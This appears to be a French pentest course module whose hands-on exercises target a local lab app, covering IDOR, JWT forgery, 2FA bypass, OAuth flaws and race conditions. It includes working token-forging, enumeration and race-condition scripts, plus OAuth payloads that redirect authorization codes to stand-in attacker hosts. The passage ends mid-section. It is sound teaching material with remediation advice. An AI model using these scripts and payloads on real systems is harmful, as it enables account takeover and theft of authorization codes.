# Module 3 — Authentification & Logique Métier

**Durée :** 1h00 (13:30—14:30)
**Tag MITRE ATT&CK :** T1078, T1134, T1548, T1068
**Référentiel :** NIS2 (Art. 21), OWASP Top 10 (A1, A4, A7)

---

## Table des matières

1. [Broken Access Control — IDOR](#1-broken-access-control--idor)
2. [Attaques JWT](#2-attaques-jwt)
3. [2FA Bypass & OAuth Flaws](#3-2fa-bypass--oauth-flaws)
4. [Race Conditions & TOCTOU](#4-race-conditions--toctou)
5. [Logique Métier — Workflow Abuse](#5-logique-métier--workflow-abuse)
6. [TP Synthèse](#6-tp-synthèse)

---

## 1. Broken Access Control — IDOR

### 1.1 Qu'est-ce que l'IDOR ?

**IDOR** (Insecure Direct Object Reference) est une vulnérabilité de contrôle d'accès qui survient lorsqu'une application expose une référence directe à un objet interne (ID, numéro de compte, clé) sans vérifier que l'utilisateur est autorisé à accéder à cet objet.

**Principe :** L'attaquant modifie un paramètre dans la requête (URL, body JSON, cookie) pour accéder à une ressource qui ne lui appartient pas.

```
GET /api/profile/2  →  profil de l'utilisateur courant (autorisé)
GET /api/profile/1  →  profil de l'admin (NON autorisé → IDOR !)
```

**Tag MITRE ATT&CK :**

| Technique | ID | Description |
|-----------|----|-------------|
| Abuse Elevation Control Mechanism | T1548 | Contournement des mécanismes d'élévation |
| Access Token Manipulation | T1134 | Manipulation de jetons pour usurper une identité |

### 1.2 Vecteurs d'attaque IDOR

#### 1.2.1 IDOR sur paramètres numériques

Le cas le plus simple : l'identifiant est un entier séquentiel.

```http
GET /api/profile/3 HTTP/1.1
Host: localhost:8080
Cookie: token=eyJ...

# L'attaquant incrémente l'ID : 1, 2, 3, 4...
```

**Détection :** Utiliser Burp Suite Intruder avec une payload `Numbers` de 1 à 100. Observer les réponses `200 OK` vs `403`/`404`.

#### 1.2.2 IDOR sur UUID

Même principe, mais l'identifiant est un UUID universel.

```http
GET /api/document/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
```

**Détection :** Si un UUID est exposé dans une réponse (ex. email, notification), il peut être réutilisé sur un autre compte. Collecter tous les UUID visibles et les tester.

#### 1.2.3 IDOR sur paramètres cachés

L'IDOR ne se limite pas aux URL : il peut se trouver dans :

- **Headers personnalisés :** `X-User-ID: 2`
- **Body JSON :** `{"user_id": 2, "action": "delete"}`
- **Cookies :** `userId=2`
- **Paramètres POST :** `user[id]=2`

```http
POST /api/delete-account HTTP/1.1
Content-Type: application/json

{
    "user_id": 2,
    "confirm": true
}
```

L'attaquant change `user_id` en `1` pour supprimer le compte admin.

### 1.3 Élévation horizontale vs verticale

| Critère | Horizontale | Verticale |
|---------|-------------|-----------|
| **Définition** | Accès aux données d'un autre utilisateur de même niveau | Accès à des fonctionnalités ou données d'un niveau supérieur (admin) |
| **Exemple** | `user A` lit les emails de `user B` | `user` exécute une action `admin` |
| **Impact** | Fuite de données, privacy | Prise de contrôle totale |
| **ID ATT&CK** | T1548 | T1134 |
| **Détection** | Anomalies dans les accès ressources par utilisateur | Requêtes vers des endpoints admin sans privilèges |
| **Remédiation** | Vérifier l'appartenance de la ressource à l'utilisateur | Vérifier le rôle avant chaque action sensible |

### 1.4 NIS2 & Authentification

La directive **NIS2 (UE 2022/2555)** — transposée en France par l'ANSSI — impose à l'**Article 21** des mesures de gestion des risques, notamment :

**Exigences applicables :**

1. **Contrôle d'accès stricte** (Art. 21(2)(c)) : « Les États membres veillent à ce que les entités prennent des mesures techniques, opérationnelles et organisationnelles appropriées [...] pour prévenir ou minimiser l'impact des incidents. »
   - Mise en œuvre : RBAC (Role-Based Access Control) vérifié côté serveur, jamais côté client.

2. **Gestion des identités** (Art. 21(2)(d)) : Politiques de mots de passe, MFA, revue des accès.
   - Mise en œuvre : Principe du moindre privilège — un utilisateur ne doit accéder qu'aux ressources nécessaires à sa tâche.

3. **Journalisation et détection** (Art. 21(2)(e)) : Surveillance des accès anormaux.
   - Mise en œuvre : Logs d'accès, alertes sur les IDOR détectés, corrélation SIEM.

### 1.5 TP Guidé — IDOR sur `/api/profile/{id}`

**Objectif :** Lire le profil de l'administrateur en exploitant un IDOR sur le endpoint `/api/profile/{id}`.

**Lab :** http://localhost:8080

**Étape 1 — Connexion à l'application**

```bash
# Se connecter avec le compte user standard
curl -c /tmp/cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" \
  -L
```

> **Explication :** L'option `-c /tmp/cookies.txt` sauvegarde les cookies (dont le JWT) dans un fichier. L'option `-L` suit les redirections.

**Étape 2 — Lire son propre profil**

```bash
curl -b /tmp/cookies.txt http://localhost:8080/api/profile/2
```

Réponse :

```json
{
    "id": 2,
    "email": "user@ecovault.com",
    "role": "user",
    "api_key": null,
    "created_at": "2026-06-01T08:00:00"
}
```

> **Explication :** L'utilisateur `user@ecovault.com` a l'ID 2 dans la base. Il peut lire son profil normalement.

**Étape 3 — Exploiter l'IDOR pour lire le profil admin**

```bash
curl -b /tmp/cookies.txt http://localhost:8080/api/profile/1
```

Réponse :

```json
{
    "id": 1,
    "email": "admin@ecovault.com",
    "role": "admin",
    "api_key": "flag{admin_api_key_4a7b9c}",
    "created_at": "2026-06-01T08:00:00"
}
```

> **Explication :** Le endpoint ne vérifie PAS que l'ID demandé correspond à l'utilisateur connecté. Il suffit de changer `user_id` de `2` à `1` pour obtenir le profil admin, incluant sa clé API (flag).

**Étape 4 — Automatisation avec un script Python**

```python
#!/usr/bin/env python3
"""
Script d'automatisation IDOR — Extraction de tous les profils utilisateurs.
"""
import requests

BASE = "http://localhost:8080"
session = requests.Session()

# Connexion
session.post(f"{BASE}/login", data={
    "email": "user@ecovault.com",
    "password": "User2026!"
})

# Bruteforce des IDs
for user_id in range(1, 7):
    resp = session.get(f"{BASE}/api/profile/{user_id}")
    if resp.status_code == 200:
        data = resp.json()
        print(f"[+] ID {user_id}: {data.get('email')} — rôle: {data.get('role')} — API key: {data.get('api_key')}")
    else:
        print(f"[-] ID {user_id}: {resp.status_code}")
```

```bash
python3 idor_enum.py
```

Résultat attendu :

```
[+] ID 1: admin@ecovault.com — rôle: admin — API key: flag{admin_api_key_4a7b9c}
[+] ID 2: user@ecovault.com — rôle: user — API key: None
[+] ID 3: alice@ecovault.com — rôle: user — API key: flag{alice_api_key_2f8e1d}
[+] ID 4: bob@ecovault.com — rôle: user — API key: None
[+] ID 5: charlie@ecovault.com — rôle: user — API key: None
[+] ID 6: eve@ecovault.com — rôle: user — API key: flag{eve_api_key_9c3b7a}
```

**Étape 5 — Analyser la vulnérabilité dans le code**

```python
# Extrait de app.py — ligne 234-241
@app.route('/api/profile/<int:user_id>')
def api_profile(user_id):
    """T1548 / T1134 — IDOR — Aucune vérification d'appartenance"""
    # ⚠️ IDOR — Pas de vérification que user_id == utilisateur connecté
    user = query_db(f"SELECT id, email, role, api_key, created_at FROM users WHERE id={user_id}", one=True)
    if user:
        return jsonify(user)
    return jsonify({'error': 'Utilisateur non trouvé'}), 404
```

> **Analyse :** Deux failles :
> 1. Absence de vérification d'appartenance — on devrait comparer `user_id` avec l'ID extrait du JWT
> 2. Requête SQL non paramétrée — vulnérable à l'injection SQL également

**Flag obtenu :** `flag{admin_api_key_4a7b9c}`

---

## 2. Attaques JWT

### 2.1 Rappel structure JWT

Le **JSON Web Token (JWT)** est un format d'échange de jetons (RFC 7519) composé de trois parties séparées par des points (`.`).

```
base64(Header).base64(Payload).base64(Signature)
```

#### Header (en-tête)

```json
{
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key1"
}
```

- `alg` : algorithme de signature (HS256, RS256, none)
- `typ` : type du token (généralement "JWT")
- `kid` : Key ID — identifiant de la clé à utiliser (optionnel)

#### Payload (corps)

```json
{
    "user_id": 2,
    "email": "user@ecovault.com",
    "role": "user",
    "kid": "key1",
    "iat": 1717200000,
    "exp": 1717203600
}
```

- Contient les **claims** (revendications) : identité, rôles, permissions
- `iat` (issued at) : date d'émission
- `exp` (expiration) : date d'expiration

#### Signature

```text
HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secret_key
)
```

La signature garantit l'intégrité du token : si le payload est modifié, la signature ne correspond plus.

**Tag MITRE ATT&CK :**

| Technique | ID | Description |
|-----------|----|-------------|
| Valid Accounts | T1078 | Utilisation de comptes valides |
| Access Token Manipulation | T1134 | Forge/modification de jetons d'accès |

### 2.2 Attaque 1 — None Algorithm

**Principe :** L'algorithme `none` signifie que le JWT n'est pas signé. Si le serveur ne vérifie pas cette valeur, l'attaquant peut modifier le payload et supprimer la signature.

#### Déroulement

**Étape 1 — Obtenir un JWT légitime**

```bash
# Connexion et capture du token
curl -c /tmp/cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" \
  -L

# Extraire le token du cookie
grep token /tmp/cookies.txt | awk '{print $NF}'
```

**Étape 2 — Analyser le JWT sur jwt.io**

Ouvrir https://jwt.io et coller le token. L'interface décode les trois parties.

On obtient :

```
HEADER:  {"alg":"HS256","typ":"JWT"}
PAYLOAD: {"user_id":2,"email":"user@ecovault.com","role":"user","kid":"key1"}
```

**Étape 3 — Forger un token avec l'algorithme `none`**

```python
#!/usr/bin/env python3
"""
Forge un JWT avec l'algorithme 'none' pour devenir administrateur.
"""
import base64
import json

def b64encode(data):
    """Base64 URL-safe encoding sans padding."""
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

# Header modifié avec alg: none
header = {"alg": "none", "typ": "JWT"}

# Payload modifié — user_id=1, role=admin
payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

# Token sans signature (on s'arrête après le payload)
token = f"{b64encode(header)}.{b64encode(payload)}."

print(f"Token forgé (none algorithm) :\n{token}")
```

```bash
python3 jwt_none_forge.py
```

**Étape 4 — Tester le token forgé**

```bash
# Utiliser le token forgé pour accéder au dashboard admin
curl -X GET http://localhost:8080/dashboard \
  -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9."
```

**Étape 5 — Accéder aux fonctionnalités admin**

```bash
# Tester l'accès à l'interface admin SANS être admin
curl -X GET http://localhost:8080/admin/templates \
  -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9."
```

#### Analyse du code vulnérable

```python
# Extrait de app.py — ligne 252-254
if header.get('alg') == 'none':
    # Attaque "none algorithm"
    return jwt.decode(token, options={"verify_signature": False})
```

> **Explication :** Le code vérifie explicitement si `alg == 'none'` et désactive alors la vérification de signature. Une bibliothèque JWT correctement configurée devrait **toujours** rejeter l'algorithme `none`.

### 2.3 Attaque 2 — HMAC/RSA Confusion

**Principe :** Le serveur utilise normalement une paire de clés RSA (publique/privée). L'attaquant récupère la clé publique (souvent exposée via un endpoint) et l'utilise comme secret HMAC pour signer un nouveau token avec l'algorithme `HS256`.

```
Scénario normal :
  Serveur signe avec clé privée (RS256) → Client vérifie avec clé publique

Attaque :
  Attaquant signe avec clé publique (HS256) → Serveur vérifie avec clé publique
  (Confusion entre asymétrique et symétrique)
```

**Étape 1 — Récupérer la clé publique RSA**

```bash
curl http://localhost:8080/api/jwt-info
```

Réponse :

```json
{
    "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcd0xBXh0w16f\nwLM8m5l8JqQfLpKzPq5n3bR6wX0hYsT8vK3mN1bR4qWxZ5jL9pM2cR7vS8tY0aB1\nnK4xQ6zJ9wV3mD5fH8jL2pR7tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6\nzJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5\nfH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0\nbN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6\nzQIDAQAB\n-----END PUBLIC KEY-----",
    "algorithm": "RS256",
    "note": "Clé publique utilisée pour la vérification des signatures JWT"
}
```

**Étape 2 — Forger un token avec la clé publique comme secret HMAC**

```python
#!/usr/bin/env python3
"""
Forging JWT — HMAC/RSA confusion attack.
Utilise la clé publique RSA comme secret HMAC.
"""
import jwt
import requests

# Récupérer la clé publique
resp = requests.get("http://localhost:8080/api/jwt-info")
public_key = resp.json()["public_key"]

# Forger le payload avec le rôle admin
payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

# Signer avec HS256 en utilisant la clé PUBLIQUE comme secret !
token = jwt.encode(payload, public_key, algorithm="HS256")

print(f"Token forgé (HMAC/RSA confusion) :\n{token}")
```

```bash
pip3 install pyjwt requests
python3 jwt_hmac_rsa_confusion.py
```

**Étape 3 — Tester le token forgé**

```bash
# Utiliser le token forgé
curl -X GET http://localhost:8080/dashboard \
  -b "token=PASTE_YOUR_TOKEN_HERE"
```

#### Analyse du code vulnérable

```python
# Extrait de app.py — ligne 271-279
if header.get('alg') == 'RS256':
    try:
        return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])
    except jwt.InvalidSignatureError:
        # RSA/HMAC confusion : accepte HS256 avec la clé publique comme secret
        try:
            return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])
        except Exception:
            pass
```

> **Explication :** Si la vérification RS256 échoue, le code essaie HS256 avec la **même clé** (publique). L'attaquant peut signer son token avec la clé publique en utilisant HS256, et le serveur l'acceptera.

### 2.4 Attaque 3 — Kid Injection

**Principe :** Le paramètre `kid` (Key ID) dans l'en-tête JWT est utilisé pour sélectionner la clé de vérification. Si l'application lit le fichier pointé par `kid` sans le valider, l'attaquant peut :

- Faire un **path traversal** : `kid: ../../dev/null` → clé vide
- Faire une **SQL injection** : `kid: " UNION SELECT 'secret' -- ` → clé arbitraire

**Étape 1 — Forger un token avec `kid` path traversal**

```python
#!/usr/bin/env python3
"""
Forging JWT — Kid injection via /dev/null (clé vide).
"""
import jwt

# Header avec kid pointant vers /dev/null
header = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}

payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

# Le serveur lit /dev/null → chaîne vide comme clé
token = jwt.encode(payload, "", algorithm="HS256", headers=header)

print(f"Token forgé (kid injection /dev/null) :\n{token}")
```

```bash
python3 jwt_kid_injection.py
```

**Étape 2 — Tester le token forgé**

```bash
curl -X GET http://localhost:8080/admin/debug \
  -b "token=PASTE_TOKEN"
```

#### Analyse du code vulnérable

```python
# Extrait de app.py — ligne 258-264
if '../' in str(kid) or '/dev/' in str(kid):
    if 'null' in str(kid):
        return jwt.decode(token, '', algorithms=['HS256'])
    return jwt.decode(token, options={"verify_signature": False})
```

> **Explication :** Le code détecte les patterns de path traversal et, au lieu de les bloquer, les utilise comme condition pour désactiver la vérification ou utiliser une clé vide.

### 2.5 Outils pour l'attaque JWT

#### 2.5.1 jwt.io (Site web)

**URL :** https://jwt.io

**Utilisation :**
1. Coller un JWT dans l'interface
2. Lecture automatique du header, payload, signature
3. Modification interactive du header/payload
4. Re-signature avec une clé de son choix

> **Limitation :** Ne permet pas de générer des attaques avancées (kid injection, HMAC/RSA confusion). Utiliser plutôt PyJWT ou jwt_tool.

#### 2.5.2 PyJWT (Bibliothèque Python)

**Installation :**

```bash
pip3 install pyjwt
```

**Utilisation pour les attaques :**

```python
import jwt

# Token normal
payload = {"user_id": 2, "role": "user"}
token = jwt.encode(payload, "secret", algorithm="HS256")

# None algorithm
token_none = jwt.encode(payload, "", algorithm="none")

# HMAC/RSA confusion
public_key = open("public.pem").read()
token_confusion = jwt.encode(payload, public_key, algorithm="HS256")

# Kid injection
headers = {"kid": "/dev/null"}
token_kid = jwt.encode(payload, "", algorithm="HS256", headers=headers)
```

#### 2.5.3 jwt_tool (Outil en ligne de commande)

**Installation :**

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

**Utilisation :**

```bash
# Analyser un JWT
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyfQ.xxxx

# Tester l'algorithme "none"
python3 jwt_tool.py TOKEN -X a -I -pc role -pv admin

# Tester le path traversal sur kid
python3 jwt_tool.py TOKEN -X k -kc ../../../dev/null

# Scan complet des vulnérabilités
python3 jwt_tool.py TOKEN -T
```

### 2.6 TP Guidé — Forger un JWT Admin

**Objectif :** Enchaîner les trois attaques JWT pour obtenir un token admin et accéder à l'endpoint `/admin/debug`.

**Étape 1 — Récupérer un JWT légitime**

```bash
curl -c /tmp/jwt_cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" -L
```

**Étape 2 — Analyser la configuration JWT**

```bash
curl http://localhost:8080/api/jwt-info | jq .
```

**Étape 3 — Attaque par None Algorithm**

```python
#!/usr/bin/env python3
"""
jwt_admin_forge.py — Tentative des 3 attaques JWT
"""
import jwt
import requests

BASE = "http://localhost:8080"

# Récupérer la clé publique
pub = requests.get(f"{BASE}/api/jwt-info").json()["public_key"]

# Payload admin
admin_payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

print("="*60)
print("Attaque 1 — None Algorithm")
token1 = jwt.encode(admin_payload, "", algorithm="none")
print(f"Token: {token1}")
r1 = requests.get(f"{BASE}/admin/debug", cookies={"token": token1})
print(f"Status: {r1.status_code} — {r1.text[:100] if r1.ok else 'FAIL'}")
print()

print("="*60)
print("Attaque 2 — HMAC/RSA Confusion")
token2 = jwt.encode(admin_payload, pub, algorithm="HS256")
print(f"Token: {token2}")
r2 = requests.get(f"{BASE}/admin/debug", cookies={"token": token2})
print(f"Status: {r2.status_code} — {r2.text[:100] if r2.ok else 'FAIL'}")
print()

print("="*60)
print("Attaque 3 — Kid Injection (/dev/null)")
token3 = jwt.encode(admin_payload, "", algorithm="HS256", headers={"kid": "/dev/null"})
print(f"Token: {token3}")
r3 = requests.get(f"{BASE}/admin/debug", cookies={"token": token3})
print(f"Status: {r3.status_code} — {r3.text[:100] if r3.ok else 'FAIL'}")
```

```bash
python3 jwt_admin_forge.py
```

**Étape 4 — Vérifier l'accès admin**

```bash
# Remplacer TOKEN par le résultat de l'attaque 2 ou 3
TOKEN="eyJ..."
curl -X GET http://localhost:8080/admin/debug \
  -b "token=$TOKEN" | jq .
```

Réponse attendue :

```json
{
    "internal_hosts": ["10.0.0.10:8081", "10.0.0.10:25"],
    "hint": "Le serveur SMTP interne contient des messages sensibles",
    "flag_4": "flag{ssti_rce_admin_2026}"
}
```

**Flag obtenu :** `flag{ssti_rce_admin_2026}`

---

## 3. 2FA Bypass & OAuth Flaws

**Tag MITRE ATT&CK :** T1078 (Valid Accounts) — Contournement de l'authentification multifacteur.

### 3.1 Force brute du code 2FA (absence de rate-limiting)

**Principe :** Le code 2FA est souvent un code à 4-6 chiffres. Sans limitation de tentatives, l'attaquant peut le bruteforcer en quelques secondes.

**Espace de recherche :**
- 4 chiffres → 10 000 combinaisons
- 6 chiffres → 1 000 000 combinaisons

À 100 requêtes/seconde, un code 4 chiffres est craqué en ~100 secondes.

**Détection :**

```bash
# Tester l'absence de rate-limiting sur l'endpoint 2FA
for i in $(seq 1 100); do
  curl -X POST http://localhost:8080/api/2fa/verify \
    -d "code=$i" \
    -w "%{http_code}\n" -o /dev/null -s
done | sort | uniq -c
```

> **Explication :** Si le serveur retourne autre chose que `429 Too Many Requests` ou `400 Bad Request` pour les 100 tentatives, le rate-limiting est absent.

**Exploitation avec Burp Suite Intruder :**

1. Intercepter la requête POST `/api/2fa/verify`
2. Envoyer à Intruder (`Ctrl+I`)
3. Positionner la payload sur le paramètre `code`
4. Configurer : Payload type = `Numbers`, de `0000` à `9999`, step = `1`
5. Lancer l'attaque
6. Trier par `Length` — la réponse avec le code valide aura une taille différente

### 3.2 Response Manipulation

**Principe :** L'application peut renvoyer un flag JSON indiquant le succès ou l'échec de l'authentification 2FA dans la réponse. L'attaquant modifie cette réponse (avec un proxy comme Burp) pour contourner la vérification.

**Déroulement :**

```http
POST /api/2fa/verify HTTP/1.1
Content-Type: application/json

{"code": "1234"}
```

Réponse normale (échec) :

```json
{"success": false, "error": "Code invalide"}
```

**Attaque :** Intercepter la requête avec Burp, activer « Intercept Response », et modifier la réponse :

```json
{"success": true, "token": "admin-jwt-forged"}
```

> **Note :** Cette attaque fonctionne uniquement si la logique 2FA est gérée côté client (JavaScript), ce qui est une erreur de conception grave.

### 3.3 Direct Endpoint Access

**Principe :** L'application peut avoir une étape 2FA côté client **sans** vérification côté serveur. L'attaquant accède directement à l'endpoint protégé sans passer par la vérification 2FA.

```bash
# Au lieu de :
# POST /api/2fa/verify → redirect → GET /dashboard

# L'attaquant accède directement :
curl http://localhost:8080/dashboard \
  -b "session=TOKEN_SANS_2FA"
```

Si le serveur ne vérifie pas que le flag `2fa_verified` est présent dans la session, l'accès est accordé.

### 3.4 OAuth 2.0 Flaws

#### 3.4.1 Redirect URI non validé

**Principe :** Le paramètre `redirect_uri` n'est pas vérifié côté serveur. L'attaquant redirige le code d'autorisation vers son propre serveur.

```http
GET /oauth/authorize?client_id=app_client&redirect_uri=https://attaquant.com/callback&response_type=code&scope=openid+profile
```

**Exploitation :**

```bash
# 1. L'attaquant envoie un lien à la victime
# 2. La victime clique et s'authentifie
# 3. Le code d'autorisation est envoyé à https://attaquant.com/callback?code=AUTH_CODE
# 4. L'attaquant échange le code contre un token :
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://attaquant.com/callback&client_id=app_client"
```

**Détection :**

```bash
# Tester plusieurs redirect_uri
curl "http://localhost:8080/oauth/authorize?client_id=app_client&redirect_uri=https://evil.com/callback&response_type=code"
curl "http://localhost:8080/oauth/authorize?client_id=app_client&redirect_uri=file:///etc/passwd&response_type=code"
curl "http://localhost:8080/oauth/authorize?client_id=app_client&redirect_uri=javascript:alert(1)&response_type=code"
```

#### 3.4.2 CSRF sur Init OAuth

**Principe :** L'initiation du flux OAuth n'est pas protégée par un token anti-CSRF. L'attaquant force la victime à linker son compte à l'application attaquante.

```html
<!-- L'attaquant héberge cette page -->
<img src="http://localhost:8080/oauth/authorize?client_id=evil_app&redirect_uri=https://evil.com/callback&response_type=code&state=ATTACKER_STATE" style="display:none">
```

**Conséquence :** Le compte de la victime est lié à l'application malveillante, donnant accès à ses données.

#### 3.4.3 Scope Upgrade / Scope Squatting

**Principe :** L'attaquant obtient un token avec un scope limité (ex. `email`), mais le modifie pour obtenir un scope plus large (ex. `admin`).

```http
POST /oauth/token HTTP/1.1
Content-Type: application/json

{
    "grant_type": "authorization_code",
    "code": "AUTH_CODE",
    "scope": "openid email admin"  ← scope ajouté !
}
```

Si le serveur ne vérifie pas que le scope demandé correspond au scope accordé initialement, l'attaque réussit.

#### 3.4.4 Replay du Code d'Autorisation

**Principe :** Le code d'autorisation n'est pas marqué comme `one-time use`. L'attaquant l'intercepte et l'utilise plusieurs fois.

```bash
# Première utilisation (valide)
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code&code=VALID_CODE&client_id=app_client&redirect_uri=https://app.com/callback"

# Deuxième utilisation (NE DEVRAIT PAS fonctionner)
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code&code=VALID_CODE&client_id=app_client&redirect_uri=https://app.com/callback"
```

**Détection :** Intercepter un code d'autorisation et le soumettre deux fois. Si la deuxième requête retourne un token valide, le code est réutilisable.

### 3.5 TP Guidé — Contournement 2FA

**Objectif :** Contourner la vérification 2FA sur le lab.

**Note :** Le lab EcoVault ne dispose pas d'un endpoint 2FA dédié. Cet exercice simule un contournement en accédant directement aux ressources protégées après avoir forgé un JWT admin (voir section 2).

**Étape 1 — Forger un JWT admin**

```bash
# Utiliser jwt_tool pour forger un token admin
python3 jwt_tool.py -X a -I -pc role -pv admin \
  -b "token=$(curl -s -c - -X POST http://localhost:8080/login -d 'email=user@ecovault.com&password=User2026!' | grep token | awk '{print $NF}')"
```

**Étape 2 — Simuler un contournement 2FA**

```bash
# Accès direct à une ressource admin sans passer par la 2FA
TOKEN_ADMIN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9.SIGNATURE"

curl -X GET http://localhost:8080/admin/templates \
  -b "token=$TOKEN_ADMIN"
```

**Étape 3 — Vérifier l'accès sans restriction 2FA**

```bash
# L'application ne requiert PAS de vérification 2FA supplémentaire
# → Vulnérabilité : Single Factor Authentication uniquement
curl -s -b "token=$TOKEN_ADMIN" http://localhost:8080/api/whoami | jq .
```

Réponse :

```json
{
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin",
    "kid": "key1"
}
```

**Étape 4 — Recommandations NIS2**

Conformément à l'**Article 21** de NIS2, l'authentification multifacteur (MFA) doit être implémentée pour :

- Tout accès à des interfaces d'administration
- Tout accès à distance
- Tout accès à des données sensibles

**Remédiation côté serveur (exemple Flask) :**

```python
# À implémenter dans app.py
@app.route('/admin/templates')
def admin_templates():
    token = request.cookies.get('token')
    user = decode_jwt(token)
    if not user or user.get('role') != 'admin':
        return jsonify({'error': 'Non autorisé'}), 403
    if not user.get('2fa_verified'):
        return redirect(url_for('verify_2fa'))
    # Suite du traitement...
```

---

## 4. Race Conditions & TOCTOU

**Tag MITRE ATT&CK :** T1068 — Exploitation for Privilege Escalation

### 4.1 Time-of-Check Time-of-Use (TOCTOU)

**Principe :** La vulnérabilité TOCTOU survient lorsqu'il y a un délai entre la **vérification** d'une condition (Time-of-Check) et l'**utilisation** du résultat (Time-of-Use). Pendant ce délai, l'état du système peut changer.

```
Time-of-Check (TOC) : Vérifier que le coupon n'a pas été utilisé
         │
         │   ← DÉLAI (vulnérable aux interférences)
         │
Time-of-Use (TOU)  : Marquer le coupon comme utilisé
```

Si l'attaquant envoie **plusieurs requêtes simultanément** pendant ce délai, toutes les vérifications passent avant qu'aucune n'ait marqué le coupon comme utilisé.

**Diagramme de l'attaque :**

```
Requête 1 ──→ TOC (coupon valide ✅) ──→ ... délai ... ──→ TOU (marquer utilisé)
Requête 2 ──→ TOC (coupon valide ✅) ──→ ... délai ... ──→ TOU (marquer utilisé)
Requête 3 ──→ TOC (coupon valide ✅) ──→ ... délai ... ──→ TOU (marquer utilisé)
```

Les trois requêtes passent le TOC avant qu'aucune n'ait atteint le TOU.

### 4.2 Turbo Intruder — Installation et Script d'Attaque

**Turbo Intruder** est une extension Burp Suite pour les attaques de race condition. Elle envoie des centaines de requêtes en parallèle.

**Installation :**

1. Ouvrir Burp Suite
2. Aller dans `Extender` → `BApp Store`
3. Rechercher `Turbo Intruder`
4. Cliquer sur `Install`

**Alternative (autonome) :**

```bash
# Installation via pip (version Python standalone)
pip3 install turbointruder
```

**Script d'attaque de race condition :**

```python
#!/usr/bin/env python3
"""
Turbo Intruder — Script d'attaque Race Condition
Cible : /api/transfer avec le coupon VIP50
"""
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3 import disable_warnings

disable_warnings()

BASE = "http://localhost:8080"
COUPON = "VIP50"
AMOUNT = 1000  # Montant à créditer
NUM_THREADS = 50  # Nombre de requêtes simultanées

def attack(session):
    """Envoie une requête de transfert avec le coupon."""
    resp = session.post(f"{BASE}/api/transfer", data={
        "coupon": COUPON,
        "amount": AMOUNT
    }, timeout=10)
    try:
        data = resp.json()
        if data.get("success"):
            return f"[+] SUCCESS — Discount: {data.get('discount')} — Final: {data.get('final')}"
        elif "déjà utilisé" in str(data.get("error", "")):
            return "[-] Coupon déjà utilisé"
        else:
            return f"[-] {data.get('error', resp.text[:100])}"
    except Exception as e:
        return f"[!] Erreur: {e}"

def main():
    # Créer une session de base
    base_session = requests.Session()
    base_session.post(f"{BASE}/login", data={
        "email": "user@ecovault.com",
        "password": "User2026!"
    })

    print(f"[*] Lancement de {NUM_THREADS} requêtes parallèles sur /api/transfer")
    print(f"[*] Coupon: {COUPON}, Montant: {AMOUNT}")
    print("="*60)

    results = []
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(attack, base_session) for _ in range(NUM_THREADS)]
        for future in as_completed(futures):
            results.append(future.result())

    for r in results:
        print(r)

    # Compter les succès
    successes = [r for r in results if "[+] SUCCESS" in r]
    print(f"\n[+] {len(successes)}/{NUM_THREADS} requêtes ont réussi (race condition exploitée)")

if __name__ == "__main__":
    main()
```

```bash
python3 race_condition_turbo.py
```

### 4.3 Cas concrets de Race Condition

#### 4.3.1 Double Spending (dépense multiple)

**Scénario :** Un coupon de réduction ne peut être utilisé qu'une fois. L'attaquant envoie 50 requêtes simultanées pour utiliser le même coupon 50 fois.

#### 4.3.2 Vote Multiple

**Scénario :** Un système de vote limite un vote par utilisateur. L'attaquant envoie des votes simultanés pour voter plusieurs fois.

```python
# Exemple conceptuel
endpoint = "POST /api/vote"
payload = {"candidate_id": 1}

# 100 votes simultanés
for _ in range(100):
    executor.submit(session.post, endpoint, json=payload)
```

#### 4.3.3 Limit Bypass (contournement de limite)

